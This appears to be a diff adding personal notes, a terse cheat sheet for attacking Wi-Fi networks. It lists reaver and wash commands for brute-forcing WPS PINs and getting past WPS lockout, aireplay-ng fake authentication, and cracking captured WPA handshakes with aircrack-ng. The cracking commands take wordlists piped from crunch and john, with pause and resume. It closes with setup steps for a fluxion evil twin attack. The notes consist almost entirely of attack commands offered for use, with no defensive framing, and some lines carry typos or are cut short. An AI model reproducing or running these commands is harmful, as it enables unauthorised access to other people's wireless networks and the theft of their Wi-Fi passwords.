@@ -1,0 +1,71 @@
+cracking wps
+
+
+wash -i mon0
+
+
+reaver --bssid  --channel 11 -i mon0 -A
+
+to associate with the target
+
+aireplay-ng --fakeautho 100 -a mac address -h enter your own mac address mon0
+(enter ifconfig wlan0)
+
+
+Debuging
+reaver --bssid --channel 11 -i mon0 -A -vvv
+
+aireplay-ng --fakeautho 100 -a mac address -h enter your own mac address mon0
+reaver --help
+(for all options to use reaver)
+reaver --bssid mac address --channel 11 -i mon0 -A -vvv --no-nacks 
+
+wps lock and how to bypass it
+wash -i mon0
+reaver -b mac address -c 11 -i mon0
+reaver --bssid mac address --channel 6 -i mon0
+
+
+wps lock
+unlocking wps using mdk3
+
+
+
+pausing attack and contiue
+
+ aircrack-ng handshake-01.cap -w wpa-wordlists
+john --wordlists=wpa=wordlists --stdout 
+john --wordlist=wpa-wordlsit --stdout | aircrack-ng -w - -b mac address of the target network handshake-01.cap
+john --restore=nameofthewifi | aircrack-ng -w - -b target mac address handshake-01.cap
+
+
+piping wordlist to aircack
+crunch 8 8 -o all.txt
+crunch 8 8 | aircrack-ng -b  mac address  -w - handshake-01.cap
+
+piping wordlist to aircrack with pause & resume support
+crunch 8 8  | john --stdin --session=session1 --stdout  | aircrack-ng -b mac address -w - handshake-01.cap
+crunch 8 8 | john --restore=session1 | aircrack-ng -b mac address -w - handshake-
+
+download a tool called hashcat
+and downloads its drives
+(you can download it on windows\linux)
+
+
+
+evil twin attack using fluxion
+install fluxion
+store fluxion on the opt folder
+cd /opt
+git clone(copy link on github)press enter
+cd /opt/install fluxion
+to run fluxion
+bash fluxion.sh
+run function
+type fluxion --help
+all instruction of how to use fluxion are displayed  
+
+
+
+
+
